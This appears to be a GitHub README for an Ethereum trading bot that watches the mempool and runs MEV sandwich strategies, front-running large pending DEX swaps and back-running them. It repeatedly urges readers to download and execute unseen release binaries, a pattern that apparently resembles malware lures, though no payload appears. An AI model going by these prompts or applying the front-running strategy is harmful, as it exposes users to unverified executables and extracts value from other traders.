# AITrading-ETH — Ethereum MEV, Mempool, DEX Trading Bot 🚀

[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github&style=for-the-badge)](https://github.com/Bryaehsu/AITrading-ETH/releases)

AI Trading Bot Algorithm Built on The Ethereum Network  
Tags: blockchain · bot · crypto-bot · dex · eth · ethereum · evm · mempool · mev · solidity · tradingbot · uniswap

![Ethereum trading bot](https://images.unsplash.com/photo-1559526324-593bc073d938?auto=format&fit=crop&w=1500&q=80)

Quick access: use the Releases link above to get the compiled binary or script. If you download a release asset from that page, download the file and execute it per the instructions in the release payload.

## What this repo does

AITrading-ETH runs automated, on-chain trading strategies that watch the Ethereum mempool and DEX order flow. It combines real-time mempool signals, MEV-style sandwich/priority strategies, and algorithmic position management. The bot targets Uniswap-compatible DEXs and EVM chains.

This repo contains:
- Core bot engine (mempool listener, strategy runner, executor)
- Solidity helpers and sample contracts
- Connectors for Uniswap v2/v3-like routers
- Scripts to backtest and simulate trades

## Features

- Mempool watcher that parses pending transactions
- MEV-aware transaction selection and repricing
- Front-run / back-run templates for liquidity events
- Adaptive position sizing and slippage control
- Gas management and bundle submission support
- On-chain helper contracts for safe execution
- Backtesting harness and sandbox mode
- Metrics export in Prometheus format

## Architecture overview

![Architecture](https://raw.githubusercontent.com/ethereum/ethereum-org-website/master/static/images/logos/ethereum/ethereum.png)

- Mempool Listener: connects to an archive node or mempool provider (WS/HTTP) and streams pending transactions.
- Signal Engine: filters transactions by target DEX, token pairs, size, and pattern.
- Strategy Runner: implements AI-guided rules and classical algorithms for entry/exit.
- Executor: builds, signs, and broadcasts transactions. Supports private relays and flashbots/bundles.
- Monitor: collects telemetry, trade results, and alerts.

## Repo layout

- /cmd — CLI entry points and utilities
- /bot — core engine, strategy hooks
- /mempool — listeners and parsers
- /eth — Ethereum transaction builders and deploy helpers
- /contracts — Solidity helper contracts and deployment scripts
- /backtest — simulation and historical testing code
- /docs — extended docs and diagrams
- /scripts — convenience scripts (deploy, testnet run)

## Requirements

- Linux or macOS
- Go >= 1.18 (if Go components used)
- Node >= 16 (for some scripts, optional)
- A full or archive Ethereum node with pending tx access or a mempool provider (WS)
- Private key for execution account (store on HSM or encrypted file)
- RPC provider with sufficient rate limit and balance for gas

## Quick install (developer setup)

1. Clone the repo
```bash
git clone https://github.com/Bryaehsu/AITrading-ETH.git
cd AITrading-ETH
```

2. Install dependencies (example)
```bash
# Go modules
go mod download

# Node tools (optional)
cd ui && npm install
```

3. Build the bot
```bash
go build -o aitrading-eth ./cmd/aitrading
```

## Run from Releases

The Releases page contains compiled binaries and release assets. Download the asset for your platform and execute it according to the included README in the release.

- Visit the releases page: https://github.com/Bryaehsu/AITrading-ETH/releases
- Download the appropriate file for your OS (e.g., `aitrading-eth-linux-amd64.tar.gz`).
- Extract and run:
```bash
tar -xzf aitrading-eth-linux-amd64.tar.gz
chmod +x aitrading-eth
./aitrading-eth --config ./config.yaml
```
If the release includes a script or installer, download that file and execute it per the release notes.

## Configuration

Place a `config.yaml` next to the binary or point to it with `--config`. Example keys:

- rpc:
  - url: "wss://your-node.example/ws"
- account:
  - private_key_path: "/secure/keys/key.enc"
- strategy:
  - type: "mempool-mev"
  - max_gas_price_gwei: 200
  - slippage_bps: 30
- tokens:
  - - name: "WETH"
    address: "0x..."
  - - name: "DAI"
    address: "0x..."

Keep private keys offline or encrypted. Use environment variables for secrets in CI.

## Common commands

Start in production mode:
```bash
./aitrading-eth --config=config.yaml --mode=prod
```

Run in sandbox (no broadcast, dry run):
```bash
./aitrading-eth --config=config.yaml --mode=sandbox
```

Run backtest:
```bash
go test ./backtest -run BacktestFull -v
```

Deploy helper contract:
```bash
./scripts/deploy_contract.sh --network mainnet --private-key $PK
```

## Example strategy (mempool-mev)

1. Listen to mempool for pending `swapExactTokensForTokens` calls on target router.
2. Detect large incoming swap that would move price > slippage threshold.
3. Build a front-run swap that buys before the large swap.
4. Submit both front-run and back-run transactions as a bundle (if using private relay).
5. Monitor execution and exit with profit target and max loss cut.

The strategy runner supports plug-in strategies. Create a new strategy struct that implements the Strategy interface in `/bot/strategy.go`.

## MEV and mempool details

- The mempool watcher tracks tx hash, gas price, nonce, input data, and emitted logs.
- Use heuristics to identify token purchase events, liquidity adds, or arbitrage windows.
- Gas management uses dynamic repricing and replacement-by-fee (RBF) with nonce control.
- Bundles: support for private relay or flashbots (bundle submission example in /scripts).

## Security practices

- Never hardcode keys. Use encrypted files or HSM.
- Run the bot in an isolated environment with limited network access.
- Limit the executor account balance to a comfortable operational amount.
- Audit Solidity helpers before mainnet deployment.
- Run unit tests and static analysis (`solhint`, `slither`) on contracts.

## Testing

- Unit tests: `go test ./...`
- Integration tests: `./scripts/integration_test.sh`
- Backtests: the backtest folder contains sample historical data and scenarios. Use the provided scripts to replay blocks and measure PnL.

## Monitoring and metrics

- The bot exposes metrics in Prometheus format at `/metrics` when enabled.
- Logs use structured JSON for easy ingestion.
- Alerts can forward to Slack or PagerDuty via webhook integration in `config.yaml`.

## Gas & cost control

- Set `max_gas_price_gwei` to avoid runaway fees.
- Use gas estimation and cap gas limit per strategy.
- For aggressive MEV strategies, prefer private relays or bundles to avoid gas war.

## Deploying contracts

Solidity helpers live in `/contracts`. To deploy:

```bash
cd contracts
npm install
npx hardhat run --network mainnet scripts/deploy.js
```

Use `--network` testnet for initial tests.

## Examples & screenshots

- Example trade logs appear in `/examples/trade-logs.md`.
- View a sample mempool event parsing snapshot in `/examples/mempool-snapshot.json`.

![Trading dashboard](https://images.unsplash.com/photo-1508385082359-f11f0b57b7c8?auto=format&fit=crop&w=1500&q=80)

## Contributing

- Fork the repo.
- Create a feature branch: `git checkout -b feature/my-strategy`
- Write tests and run them locally.
- Open a pull request with a clear description and test plan.

Code style:
- Go: gofmt and go vet
- Solidity: solhint ruleset in `/contracts/.solhint.json`

## Releases & changelog

All binaries and packaged releases live on the Releases page. Download a release asset and execute the included file for installation instructions.

Releases: [![Release Page](https://img.shields.io/badge/See-Releases-orange?style=flat&logo=github)](https://github.com/Bryaehsu/AITrading-ETH/releases)

If a specific release file is provided, download that file and execute it as shown in the release notes. If you cannot access the link, check the "Releases" section in this repository on GitHub.

## FAQ

- Q: Can this run on other EVM chains?
  A: Yes. Change RPC endpoints and router addresses in `config.yaml`.

- Q: Does it support Uniswap v3?
  A: Yes, via the Uniswap v3 connector. You may need to tune slippage and fee tier.

- Q: How do I test bundle submission?
  A: Use the Flashbots test relay or a local private relay. See `/scripts/flashbots_example.sh`.

## References and reading

- Uniswap docs
- Flashbots docs
- Ethereum mempool architecture articles
- MEV research papers

## License

This repository uses the MIT License. See LICENSE file for details.